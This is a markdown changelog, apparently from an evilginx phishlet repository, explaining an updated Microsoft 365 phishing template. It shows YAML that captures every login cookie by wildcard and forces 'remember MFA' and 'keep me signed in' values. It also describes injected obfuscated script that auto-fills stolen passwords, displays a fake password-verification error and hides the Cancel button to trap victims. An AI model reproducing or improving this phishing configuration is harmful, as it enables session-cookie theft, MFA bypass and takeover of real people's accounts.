## **O365 Phishlet Update**

- legacy (evilginx v2.3.0) → [o365.yaml](../evilginx3/legacy_phishlets/o365.yaml)
- new (evilginx v2.4.0) → [o3653.yaml](../evilginx3/legacy_phishlets/o3653.yaml)

## Why?
Legacy o365 template was failing to capture cookies. This was causing MFA to not be captured (as well as other relevant authentication cookies).

## Key Changes
```
auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: [.... ,'.*,regexp']
  - domain: 'login.microsoftonline.com'
    keys: [.... '.*,regexp']   
```
- Regex wildcard to capture ALL cookies

```
auth_urls:
  - '/common/SAS/ProcessAuth'
  - '/kmsi'
  - '/'
login:
  domain: 'login.microsoftonline.com'
  path: '/' 
force_post:
  - path: '/kmsi'
    search: 
      - {key: 'LoginOptions', search: '.*'}
    force:
      - {key: 'LoginOptions', value: '1'}
    type: 'post'
  - path: '/common/SAS'
    search: 
      - {key: 'rememberMFA', search: '.*'}
    force:
      - {key: 'rememberMFA', value: 'true'}
    type: 'post'
```
- Defines authentication endpoints to monitor Force Post, which automatically modifies POST requests to:
    - Set `LoginOptions=1` on `/kmsi` (Keep Me Signed In)
    - Set `rememberMFA=true` on `/common/SAS` (bypasses MFA prompts)

```
js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/common/oauth2/","/","/*"]
    trigger_params: [email]
    script: |
        ..... obsfucated js .....
```
- `document.forms[0][0].value="{email}";`
    - Pre-fills the email field using the `{email}` parameter from the phishing URL

- Three elements in obsfucated js
    - `checkElement`
        - If the URL contains a hash, it
            - Extracts encoded password data from the URL fragment
            - Decodes it from a numerical format
            - Auto-fills the password field (#i0118)
            - Auto-clicks the submit button

    - `checkElement2`
        - Injects a fake error message stating: "Because you're accessing sensitive info, you need to verify your password"

    - `checkElement3`: Removes the "Cancel" button to prevent victims from backing out

## Additional Observations
None